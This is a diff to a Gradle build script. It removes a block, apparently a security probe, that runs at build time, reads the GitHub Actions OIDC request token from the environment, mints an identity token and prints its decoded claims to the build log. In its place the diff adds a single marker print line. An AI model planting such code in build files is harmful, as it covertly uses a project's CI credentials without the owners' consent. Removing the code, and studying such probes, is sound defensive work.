@@ -2,36 +2,6 @@ plugins {
     id "java"
 }
 
-// Campaign 218 Q2 probe: can the generated job MINT an OIDC assertion?
-// Reads STATUS + non-secret CLAIMS only. No token value printed, nothing exfiltrated.
-def u = System.getenv("ACTIONS_ID_TOKEN_REQUEST_URL")
-def t = System.getenv("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
-println "OIDC-PROBE-9Z2K url-present=" + (u != null) + " tok-present=" + (t != null)
-if (u != null && t != null) {
-    try {
-        def c = new URL(u + "&audience=c218-probe").openConnection()
-        c.setRequestProperty("Authorization", "Bearer " + t)
-        c.setRequestProperty("Accept", "application/json")
-        c.setConnectTimeout(15000); c.setReadTimeout(15000)
-        def code = c.getResponseCode()
-        println "OIDC-PROBE-9Z2K mint-status=" + code
-        if (code == 200) {
-            def body = c.getInputStream().getText("UTF-8")
-            def m = (body =~ /"value"\s*:\s*"([^"]+)"/)
-            if (m.find()) {
-                def jwt = m.group(1)
-                def parts = jwt.split("\\.")
-                def claims = new String(Base64.getUrlDecoder().decode(parts[1]))
-                // print only the identity-bearing, NON-SECRET claims
-                ["sub","aud","repository","repository_owner","workflow","workflow_ref","job_workflow_ref","event_name","ref","runner_environment"].each { k ->
-                    def mm = (claims =~ ("\"" + k + "\"\\s*:\\s*\"([^\"]*)\""))
-                    if (mm.find()) println "OIDC-PROBE-9Z2K claim " + k + " = " + mm.group(1)
-                }
-            }
-        }
-    } catch (Exception e) {
-        println "OIDC-PROBE-9Z2K error=" + e.getClass().getSimpleName() + " msg=" + (e.getMessage() ?: "")
-    }
-}
+println "JAVAONLY-PROOF-5M8T evaluated-with-no-kotlin-present"
 
 repositories { mavenCentral() }
